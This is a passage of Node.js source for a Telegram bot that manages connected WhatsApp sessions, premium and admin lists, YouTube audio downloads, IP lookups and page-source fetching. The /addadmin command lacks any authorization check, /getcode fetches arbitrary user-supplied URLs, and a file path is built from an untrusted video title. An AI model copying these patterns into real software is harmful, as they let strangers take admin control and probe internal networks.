            errorMsg = '❌ File not found on Telegram servers!';
        } else {
            errorMsg += ` Error: ${err.message}`;
        }
        await bot.sendMessage(chatId, errorMsg, {
            reply_to_message_id: msg.message_id
        });
    }
});

bot.onText(/\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const query = (match[1] || "").trim()
  if (!query) {
    return bot.sendMessage(chatId, "play judul lagu atau video", {
      reply_to_message_id: msg.message_id,
    })
  }
  try {  
    const searchRes = await axios.get(
 `https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`
    )
    const results = searchRes.data?.data
    if (!results || !results.length) {
      return bot.sendMessage(chatId, "❌ Tidak ada hasil ditemukan.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const video = results[0]
    const audioRes = await axios.get(
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`
    )
    const audioUrl = audioRes.data?.result
    if (!audioUrl) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil audio.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const caption = `<blockquote><b>
title: ${video.title}
channel: ${video.author?.name || "Unknown"}
duration: ${video.duration?.timestamp || "-"}
views: ${video.views} views
uploaded: ${video.ago}</b></blockquote>
`
const tmpFile = path.join(__dirname, `${video.title}.mp3`)
const audioResStream = await axios({
  method: "get",
  url: audioUrl,
  responseType: "stream"
})
audioResStream.data.pipe(fs.createWriteStream(tmpFile))
await new Promise((resolve, reject) => {
  audioResStream.data.on("end", resolve)
  audioResStream.data.on("error", reject)
})
await bot.sendAudio(chatId, tmpFile, {
  title: video.title,
  performer: video.author?.name || "Unknown",
  thumb: video.thumbnail,
  caption,
  parse_mode: "HTML",
  reply_to_message_id: msg.message_id
})
fs.unlinkSync(tmpFile)
  } catch (err) {
    console.error(err.response?.data || err.message)
    bot.sendMessage(chatId, err.response?.data || err.message, {
      reply_to_message_id: msg.message_id,
    })
  }
})

bot.onText(/\/listbot$/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
    if (sessions.size === 0) {
        return bot.sendMessage(chatId, "```❌\nNo WhatsApp bots connected. Please connect a bot first with Addbot```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    let botList = "```Zenzo Infinity\n";
    let index = 1;
    for (const [botNumber, sock] of sessions.entries()) {
        const status = sock.user ? "✅" : "❌";
        botList += `▢ ${index} : ${botNumber}\n`;
        botList += `▢ Status : ${status}\n`;
        index++;
    }
    botList += `▢ Total : ${sessions.size}\n`;
    botList += "```";
    await bot.sendMessage(chatId, botList, { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require('moment');

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "🙈 You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "🙈 Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

async function getSourceCode(url, chatId, bot) {
  try {
    await bot.sendMessage(chatId, `Sedang mengambil source code dari:\n${url}`);

    const response = await fetch(url);
    const text = await response.text();

    if (text.length < 4000) {
      await bot.sendMessage(chatId, `✅ Source code dari ${url}:\n\n<pre>${text}</pre>`, {



        parse_mode: "HTML"
      });
    } else {
      const filename = `source_${Date.now()}.html`;
      fs.writeFileSync(filename, text);

      await bot.sendDocument(chatId, filename, {
        caption: `✅ Source code dari ${url}`
      });

      fs.unlinkSync(filename);
    }
  } catch (error) {
    await bot.sendMessage(chatId, `❌ Gagal mengambil source code!\nError: ${error.message}`);
  }
}

bot.onText(/\/getcode (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];
  async function main() {

    try {

        await getSourceCode(url, chatId, bot);

    } catch (error) {

        console.error("Error saat mengambil source code:", error);

    }

}

main();
});

bot.onText(/\/trackingip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.')
  try {
    if (!match[1]) {
      return bot.sendMessage(chatId, "ip nya mana dongo", {
        reply_to_message_id: msg.message_id,
      });
    }
    const res = await axios.get(`https://ipwhois.app/json/${match[1]}`);
    const d = res.data;
    await bot.sendMessage(chatId, "```json\n" + JSON.stringify(d, null, 2) + "```", {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
  } catch (err) {
    bot.sendMessage(chatId, err.message, {
      reply_to_message_id: msg.message_id,
    });
  }
});

bot.onText(/\/tourl$/, async (msg) => {
    const chatId = msg.chat.id;      
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "```❌\n❌ Silakan reply sebuah file/foto/video dengan command /tourl```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }
    try {        
        const processingMsg = await bot.sendMessage(chatId, "```⌛\n⏳ Mengupload ke Catbox...```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });
        const FormData = require ("form-data");
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });
        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`*✅ Upload berhasil! 📎URL:* \`\`\`🖼️📎\n${catboxUrl}\`\`\``, {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "Markdown"
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/restart$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting bot...");

  setTimeout(() => {
    const args = [...process.argv.slice(1), "--restarted-from", String(chatId)];
    const child = exec(process.argv[0], args, {
      detached: true,
      stdio: "inherit",
    });
    child.unref();
    process.exit(0);
  }, 1000);
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🙈 You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /addadmin 7972292369.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /addadmin 7972292369.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "🙈 You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "🙈 Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `🙈 User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /deladmin 7972292369.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /deladmin 7972292369.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is not an admin.`);
    }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `🤬 ${result.error}`);
    } else {
        let teks = `
 *Informasi Channel WhatsApp*
 *ID:* ${result.id}
 *Nama:* ${result.name}
 *Total Pengikut:* ${result.subscribers}
 *Status:* ${result.status}
 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});
